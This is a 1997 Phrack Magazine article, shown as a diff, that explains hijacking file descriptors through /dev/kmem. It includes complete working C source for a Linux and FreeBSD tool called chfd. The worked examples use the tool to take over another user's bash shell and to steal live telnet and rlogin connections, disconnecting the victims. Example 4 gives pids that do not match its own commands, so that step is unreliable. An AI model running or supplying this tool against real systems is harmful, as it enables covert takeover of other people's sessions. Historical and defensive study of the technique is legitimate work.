@@ -1,0 +1,578 @@
+---[  Phrack Magazine   Volume 7, Issue 51 September 01, 1997, article 05 of 17
+
+
+-------------------------[  File Descriptor Hijacking
+
+
+--------[  orabidoo <odar@pobox.com>
+
+
+Introduction
+------------
+
+We often hear of tty hijacking as a way for root to take over a user's
+session.  The traditional tools for this use STREAMS on SysV machines,
+and one article in Phrack 50 presented a way to do it in Linux, using
+loadable modules.
+
+I'll describe here a simple technique that lets root take over a local
+or remote session.  I've implemented it for Linux and FreeBSD; it should
+be easy to port it to just about any Un*x-like system where root can
+write to kernel memory.
+
+The idea is simple: by tweaking the kernel's file descriptor tables, one
+can forcefully move file descriptors from one process to another.  
+This method allows you to do almost anything you want: redirect the
+output of a running command to a file, or even take over your neighbor's
+telnet connection.
+
+
+How the kernel keeps track of open file descriptors
+---------------------------------------------------
+
+In Un*x, processes access resources by means of file descriptors, which
+are obtained via system calls such as open(), socket() and pipe().  From
+the process's point of view, the file descriptor is an opaque handle to
+the resource.  File descriptors 0, 1 and 2 represent standard input,
+output and error, respectively.  New descriptors are always allocated in
+sequence.
+
+On the other side of the fence, the kernel keeps, for each process, a
+table of file descriptors (fds), with a pointer to a structure for each
+fd.  The pointer is NULL if the fd isn't open.  Otherwise, the structure
+holds information about what kind of fd it is (a file, a socket, a
+pipe, etc), together with pointers to data about the resource that the fd
+accesses (the file's inode, the socket's address and state information,
+and so on).
+
+The process table is usually an array or a linked list of structures.
+From the structure for a given process, you can easily find a pointer to
+the internal fd table for that process.  
+
+In Linux, the process table is an array (called "task") of struct
+task_struct's, and includes a pointer to a struct files_struct, which
+has the fd array (look at /usr/include/linux/sched.h for details).  In
+SunOS 4, the process table is a linked list of struct proc's, which
+include a pointer to the u_area, which has info about the fds (look at
+/usr/include/sys/proc.h).  In FreeBSD, it's also a linked list (called
+"allproc") of struct proc's, which include a pointer to a struct
+filedesc with the fd table (also according to /usr/include/sys/proc.h).
+
+If you have read and write access to the kernel's memory (which, in most
+cases, is the same as having read/write access to /dev/kmem), there's
+nothing to prevent you from messing with these fd tables, stealing open
+fd's from a process and reusing them in another one.  
+
+The only major case where this won't work are systems based on BSD4.4
+(such as {Free, Net, Open}BSD) running at a securelevel higher than 0.
+In that mode, write access to /dev/mem and /dev/kmem is disabled, among
+other things.  However, many BSD systems run at securelevel -1, which leaves
+them vulnerable, and in many others it may be possible to get the securelevel 
+to be -1 at the next boot by tweaking the startup scripts.  On FreeBSD, you 
+can check the securelevel with the command "sysctl kern.securelevel".  Linux 
+also has securelevels, but they don't prevent you from accessing /dev/kmem.
+
+
+File descriptor hijacking
+-------------------------
+
+The kernel's internal variables are really not made to be modified like
+this by user programs, and it shows.  
+
+First of all, on a multitasking system, you have no guarantee that the
+kernel's state won't have changed between the time you find out a
+variable's address and the time you write to it (no atomicity).  This is 
+why these techniques shouldn't be used in any program that aims for 
+reliability.  That being said, in practice, I haven't seen it fail, because 
+the kernel doesn't move this kind of data around once it has allocated it 
+(at least for the first 20 or 32 or 64 or so fds per process), and because 
+it's quite unlikely that you'll do this just when the process is closing or
+opening a new fd.
+
+You still want to try it?
+
+For simplicity's sake, we won't try to do things like duplicating an fd
+between two processes, or passing an fd from one process to another
+without passing another one in return.  Instead, we'll just exchange an
+fd in one process with another fd in another process.  This way we only
+have to deal with open files, and don't mess with things like reference
+counts.  This is as simple as finding two pointers in the kernel and
+switching them around.  A slightly more complicated version of this
+involves 3 processes, and a circular permutation of the fds.
+
+Of course, you have to guess which fd corresponds to the resource you
+want to pass.  To take complete control of a running shell, you'll want
+its standard input, output and error, so you'll need to take the 3 fds
+0, 1 and 2.  To take control of a telnet session, you'll want the fd of
+the inet socket that telnet is using to talk to the other side, which is
+usually 3, and exchange it with another running telnet (so it knows what
+to do with it).  Under Linux, a quick look at /proc/[pid]/fd will tell
+you which fds the process is using.
+
+
+Using chfd
+----------
+
+I've implemented this for Linux and FreeBSD; it would be fairly easy to
+port to other systems (as long as they let you write to /dev/mem or
+/dev/kmem, and have the equivalent of a /usr/include/sys/proc.h to
+figure out how it works).
+
+To compile chfd for Linux, you need to figure out a couple things about
+the running kernel.  If it's a 1.2.13 or similar, you'll need to
+uncomment the line /* #define OLDLINUX */, because the kernel's
+structures have changed since then.  If it's 2.0.0 or newer, it should
+work out of the box, although it could change again...    
+
+Then you need to find the symbol table for the kernel, which is usually
+in /boot/System.map or similar.  Make sure this corresponds to the
+kernel that is actually running, and look up the address for the "task"
+symbol.  You need to put this value in chfd, instead of "00192d28".
+Then compile with "gcc chfd.c -o chfd".
+
+To compile chfd for FreeBSD, just get the FreeBSD code and compile it
+with "gcc chfd.c -o chfd -lkvm".  This code was written for FreeBSD
+2.2.1, and might need tweaking for other versions.
+
+Once it's compiled, you invoke chfd with 
+
+ 	chfd pid1 fd1 pid2 fd2
+or
+	chfd pid1 fd1 pid2 fd2 pid3 fd3
+
+In the first case, the fds are just swapped.  In the second case, the
+second process gets the first's fd, the third gets the second's fd, and
+the first gets the third's fd.
+
+As a special case, if one of the pids is zero, the corresponding fd is
+discarded, and a fd on /dev/null is passed instead.
+
+
+Example 1
+---------
+
+. a long calculation is running with pid 207, and with output to the tty
+. you type "cat > somefile", and look up cat's pid (say 1746)
+
+Then doing
+
+	chfd 207 1 1746 1
+
+will redirect the calculation on the fly to the file "somefile", and the
+cat to the calculation's tty.  Then you can ^C the cat, and leave the
+calculation running without fear of important results scrolling by.
+
+
+Example 2
+---------
+
+. someone is running a copy of bash on a tty, with pid 4022
+. you are running another copy of bash on a tty, with pid 4121
+
+Then you do
+
+	sleep 10000  
+	  # on your own bash, so it won't read its tty for a while,
+	  # otherwise your shell gets an EOF from /dev/null and leaves
+	  # the session immediately
+	chfd 4022 0 0 0 4121 0
+	chfd 4022 1 0 0 4121 1
+	chfd 4022 2 0 0 4121 2
+
+and you find yourself controlling the other guy's bash, and getting the
+output too, while the guy's keystrokes go to /dev/null.  When you exit
+the shell, he gets his session disconnected, and you're back in your
+sleep 10000 which you can safely ^C now.  
+
+Different shells might use different file descriptors; zsh seems to use
+fd 10 to read from the tty, so you'll need to exchange that too.
+
+
+Example 3
+---------
+
+. someone is running a telnet on a tty, with pid 6309
+. you start a telnet to some worthless port that won't drop the 
+  connection too quickly (telnet localhost 7, telnet www.yourdomain 80,
+  whatever), with pid 7081
+. under Linux, a quick look at /proc/6309/fd and /proc/7081/fd tells you
+  telnet is using fds 0, 1, 2 and 3, so 3 must be the connection.
+
+Then doing
+
+	chfd 6309 3 7081 3 0 0
+
+will replace the network connection with a /dev/null on the guy's telnet
+(which reads an EOF, so he'll get a "Connection closed by foreign
+host."), and your telnet finds itself connected to the guy's remote
+host.  At this point you'll probably need to press ^] and type "mode
+character" to tell your telnet to stop echoing your lines locally.
+
+
+Example 4
+---------
+
+. someone is running an rlogin on a tty; each rlogin uses two processes, 
+  with pids 4547 and 4548
+. you start an rlogin localhost on another tty, with pids 4852 and 4855
+. a quick look at the relevant /proc/../fds tells you that each of the
+  rlogin processes is using fd 3 for the connection.
+
+Then doing
+
+	chfd 4547 3 4552 3
+	chfd 4548 3 4555 3
+
+does just what you expect.  Except that your rlogin may still be blocked
+by the kernel because it's waiting on an event that won't happen (having
+data to read from localhost); in that case you wake it up with a kill
+-STOP followed by 'fg'.
+
+
+You get the idea.  When a program gets another one's fd, it's important
+that it knows what to do with it; in most cases you achieve this by
+running a copy of the same program you want to take over, unless you're
+passing a fd on /dev/null (which gives an EOF) or just passing
+stdin/stdout/stderr.  
+
+
+Conclusion
+----------
+
+As you can see, you can do quite powerful things with this.  And there
+isn't really much you can do to protect yourself from some root doing
+this, either.  
+
+It could be argued that it's not even a security hole; root is
+*supposed* to be able to do these things.  Otherwise there wouldn't be
+explicit code in the drivers for /dev/kmem to let you write there, would
+there?
+
+
+The Linux code
+--------------
+
+<++> fd_hijack/chfd-linux.c
+/*  chfd - exchange fd's between 2 or 3 running processes.
+ *  
+ *  This was written for Linux/intel and is *very* system-specific.
+ *  Needs read/write access to /dev/kmem; setgid kmem is usually enough.
+ *
+ *  Use: chfd pid1 fd1 pid2 fd2 [pid3 fd3]
+ *
+ *  With two sets of arguments, exchanges a couple of fd between the 
+ *  two processes.
+ *  With three sets, the second process gets the first's fd, the third gets
+ *  the second's fd, and the first gets the third's fd.
+ *
+ *  Note that this is inherently unsafe, since we're messing with kernel
+ *  variables while the kernel itself might be changing them.  It works
+ *  in practice, but no self-respecting program would want to do this.
+ *
+ *  Written by: orabidoo <odar@pobox.com>
+ *  First version: 14 Feb 96
+ *  This version: 2 May 97
+ */
+
+
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#define __KERNEL__		/* needed to access kernel-only definitions */
+#include <linux/sched.h>
+
+/* #define OLDLINUX */		/* uncomment this if you're using Linux 1.x;
+				   tested only on 1.2.13 */
+
+#define TASK 0x00192d28		/* change this! look at the system map,
+				   usually /boot/System.map, for the address
+				   of the "task" symbol */
+
+#ifdef OLDLINUX
+#  define FD0 ((char *)&ts.files->fd[0] - (char *)&ts)
+#  define AD(fd) (taskp + FD0 + 4*(fd))
+#else
+#  define FILES ((char *)&ts.files - (char *)&ts)
+#  define FD0 ((char *)&fs.fd[0] - (char *)&fs)
+#  define AD(fd) (readvalz(taskp + FILES) + FD0 + 4*(fd))
+#endif
+
+
+int kfd;
+struct task_struct ts;
+struct files_struct fs;
+int taskp;
+
+int readval(int ad) {
+  int val, r;
+
+  if (lseek(kfd, ad, SEEK_SET) < 0)
+    perror("lseek"), exit(1);
+  if ((r = read(kfd, &val, 4)) != 4) {
+    if (r < 0)
+      perror("read");
+    else fprintf(stderr, "Error reading...\n");
+    exit(1);
+  }
+  return val;
+}
+
+int readvalz(int ad) {
+  int r = readval(ad);
+  if (r == 0)
+    fprintf(stderr, "NULL pointer found (fd not open?)\n"), exit(1);
+  return r;
+}
+
+void writeval(int ad, int val) {
+  int w;
+
+  if (lseek(kfd, ad, SEEK_SET) < 0)
+    perror("lseek"), exit(1);
+  if ((w = write(kfd, &val, 4)) != 4) {
+    if (w < 0)
+      perror("write");
+    else fprintf(stderr, "Error writing...\n");
+    exit(1);
+  }
+}
+
+void readtask(int ad) {
+  int r;
+
+  if (lseek(kfd, ad, SEEK_SET)<0)
+    perror("lseek"), exit(1);
+  if ((r = read(kfd, &ts, sizeof(struct task_struct))) !=
+	sizeof(struct task_struct)) {
+    if (r < 0)
+      perror("read");
+    else fprintf(stderr, "Error reading...\n");
+    exit(1);
+  }
+}
+
+void findtask(int pid) {
+  int adr;
+
+  for (adr=TASK; ; adr+=4) {
+    if (adr >= TASK + 4*NR_TASKS)
+      fprintf(stderr, "Process not found\n"), exit(1);
+    taskp = readval(adr);
+    if (!taskp) continue;
+    readtask(taskp);
+    if (ts.pid == pid) break;
+  }
+}
+
+int main(int argc, char **argv) {
+  int pid1, fd1, pid2, fd2, ad1, val1, ad2, val2, pid3, fd3, ad3, val3;
+  int three=0;
+
+  if (argc != 5 && argc != 7)
+    fprintf(stderr, "Use: %s pid1 fd1 pid2 fd2 [pid3 fd3]\n", argv[0]), 
+    exit(1);
+
+  pid1 = atoi(argv[1]), fd1 = atoi(argv[2]);
+  pid2 = atoi(argv[3]), fd2 = atoi(argv[4]);
+  if (argc == 7)
+    pid3 = atoi(argv[5]), fd3 = atoi(argv[6]), three=1;
+
+  if (pid1 == 0)
+    pid1 = getpid(), fd1 = open("/dev/null", O_RDWR);
+  if (pid2 == 0)
+    pid2 = getpid(), fd2 = open("/dev/null", O_RDWR);
+  if (three && pid3 == 0)
+    pid3 = getpid(), fd3 = open("/dev/null", O_RDWR);
+
+  kfd = open("/dev/kmem", O_RDWR);
+  if (kfd < 0)
+    perror("open"), exit(1);
+
+  findtask(pid1);
+  ad1 = AD(fd1);
+  val1 = readvalz(ad1);
+  printf("Found fd pointer 1, value %.8x, stored at %.8x\n", val1, ad1);
+
+  findtask(pid2);
+  ad2 = AD(fd2);
+  val2 = readvalz(ad2);
+  printf("Found fd pointer 2, value %.8x, stored at %.8x\n", val2, ad2);
+
+  if (three) {
+    findtask(pid3);
+    ad3 = AD(fd3);
+    val3 = readvalz(ad3);
+    printf("Found fd pointer 3, value %.8x, stored at %.8x\n", val3, ad3);
+  }
+
+  if (three) {
+    if (readval(ad1)!=val1 || readval(ad2)!=val2 || readval(ad3)!=val3) {
+      fprintf(stderr, "fds changed in memory while using them - try again\n");
+      exit(1);
+    }
+    writeval(ad2, val1);
+    writeval(ad3, val2);
+    writeval(ad1, val3);
+  } else {
+    if (readval(ad1)!=val1 || readval(ad2)!=val2) {
+      fprintf(stderr, "fds changed in memory while using them - try again\n");
+      exit(1);
+    }
+    writeval(ad1, val2);
+    writeval(ad2, val1);
+  }
+  printf("Done!\n");
+}
+
+<-->
+
+The FreeBSD code
+----------------
+
+<++> fd_hijack/chfd-freebsd.c
+
+/*  chfd - exchange fd's between 2 or 3 running processes.
+ *  
+ *  This was written for FreeBSD and is *very* system-specific.  Needs 
+ *  read/write access to /dev/mem and /dev/kmem; only root can usually 
+ *  do that, and only if the system is running at securelevel -1.
+ *
+ *  Use: chfd pid1 fd1 pid2 fd2 [pid3 fd3]
+ *  Compile with: gcc chfd.c -o chfd -lkvm
+ *
+ *  With two sets of arguments, exchanges a couple of fd between the 
+ *  two processes.
+ *  With three sets, the second process gets the first's fd, the third 
+ *  gets the second's fd, and the first gets the third's fd.
+ *
+ *  Note that this is inherently unsafe, since we're messing with kernel
+ *  variables while the kernel itself might be changing them.  It works
+ *  in practice, but no self-respecting program would want to do this.
+ *
+ *  Written by: orabidoo <odar@pobox.com>
+ *  FreeBSD version: 4 May 97
+ */
+
+
+#include <stdio.h>
+#include <fcntl.h>
+#include <kvm.h>
+#include <sys/proc.h>
+
+#define NEXTP ((char *)&p.p_list.le_next - (char *)&p)
+#define FILES ((char *)&p.p_fd - (char *)&p)
+#define AD(fd) (readvalz(readvalz(procp + FILES)) + 4*(fd))
+
+kvm_t *kfd;
+struct proc p;
+u_long procp, allproc;
+struct nlist nm[2];
+
+u_long readval(u_long ad) {
+  u_long val;
+
+  if (kvm_read(kfd, ad, &val, 4) != 4)
+    fprintf(stderr, "error reading...\n"), exit(1);
+  return val;
+}
+
+u_long readvalz(u_long ad) {
+  u_long r = readval(ad);
+  if (r == 0)
+    fprintf(stderr, "NULL pointer found (fd not open?)\n"), exit(1);
+  return r;
+}
+
+void writeval(u_long ad, u_long val) {
+  if (kvm_write(kfd, ad, &val, 4) != 4)
+    fprintf(stderr, "error writing...\n"), exit(1);
+}
+
+void readproc(u_long ad) {
+  if (kvm_read(kfd, ad, &p, sizeof(struct proc)) != sizeof(struct proc))
+    fprintf(stderr, "error reading a struct proc...\n"), exit(1);
+}
+
+void findproc(int pid) {
+  u_long adr;
+
+  for (adr = readval(allproc); adr; adr = readval(adr + NEXTP)) {
+    procp = adr;
+    readproc(procp);
+    if (p.p_pid == pid) return;
+  }
+  fprintf(stderr, "Process not found\n");
+  exit(1);
+}
+
+int main(int argc, char **argv) {
+  int pid1, fd1, pid2, fd2, pid3, fd3;
+  u_long ad1, val1, ad2, val2, ad3, val3;
+  int three=0;
+
+  if (argc != 5 && argc != 7)
+    fprintf(stderr, "Use: %s pid1 fd1 pid2 fd2 [pid3 fd3]\n", argv[0]), 
+    exit(1);
+
+  pid1 = atoi(argv[1]), fd1 = atoi(argv[2]);
+  pid2 = atoi(argv[3]), fd2 = atoi(argv[4]);
+  if (argc == 7)
+    pid3 = atoi(argv[5]), fd3 = atoi(argv[6]), three=1;
+
+  if (pid1 == 0)
+    pid1 = getpid(), fd1 = open("/dev/null", O_RDWR);
+  if (pid2 == 0)
+    pid2 = getpid(), fd2 = open("/dev/null", O_RDWR);
+  if (three && pid3 == 0)
+    pid3 = getpid(), fd3 = open("/dev/null", O_RDWR);
+
+  kfd = kvm_open(NULL, NULL, NULL, O_RDWR, "chfd");
+  if (kfd == NULL) exit(1);
+
+  bzero(nm, 2*sizeof(struct nlist));
+  nm[0].n_name = "_allproc";
+  nm[1].n_name = NULL;
+  if (kvm_nlist(kfd, nm) != 0)
+    fprintf(stderr, "Can't read kernel name list\n"), exit(1);
+  allproc = nm[0].n_value;
+
+  findproc(pid1);
+  ad1 = AD(fd1);
+  val1 = readvalz(ad1);
+  printf("Found fd pointer 1, value %.8x, stored at %.8x\n", val1, ad1);
+
+  findproc(pid2);
+  ad2 = AD(fd2);
+  val2 = readvalz(ad2);
+  printf("Found fd pointer 2, value %.8x, stored at %.8x\n", val2, ad2);
+
+  if (three) {
+    findproc(pid3);
+    ad3 = AD(fd3);
+    val3 = readvalz(ad3);
+    printf("Found fd pointer 3, value %.8x, stored at %.8x\n", val3, ad3);
+  }
+
+  if (three) {
+    if (readval(ad1)!=val1 || readval(ad2)!=val2 || readval(ad3)!=val3) {
+      fprintf(stderr, "fds changed in memory while using them - try again\n");
+      exit(1);
+    }
+    writeval(ad2, val1);
+    writeval(ad3, val2);
+    writeval(ad1, val3);
+  } else {
+    if (readval(ad1)!=val1 || readval(ad2)!=val2) {
+      fprintf(stderr, "fds changed in memory while using them - try again\n");
+      exit(1);
+    }
+    writeval(ad1, val2);
+    writeval(ad2, val1);
+  }
+  printf("Done!\n");
+}
+
+<-->
+
+----[  EOF
+
